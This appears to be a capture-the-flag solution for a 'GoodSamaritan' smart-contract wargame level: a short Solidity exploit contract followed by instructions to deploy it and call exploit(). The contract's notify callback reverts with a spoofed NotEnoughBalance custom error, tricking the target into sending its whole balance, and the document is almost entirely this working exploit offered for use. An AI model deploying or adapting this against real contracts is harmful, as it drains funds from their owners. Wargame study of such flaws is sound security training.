Deploy the following contract to the same network
```solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;


interface INotifyable {
    function notify(uint256) external;
}
interface GoodSamaritan {
    function requestDonation() external;
}

contract Exploit {
    error NotEnoughBalance(); 

    function notify(uint amt) public pure{
        if (amt == 10){
            revert NotEnoughBalance();
        }
    }

    function exploit(address _who) public {
        GoodSamaritan(_who).requestDonation();
    }
   
}
```
Call exploit() sending your contract instance
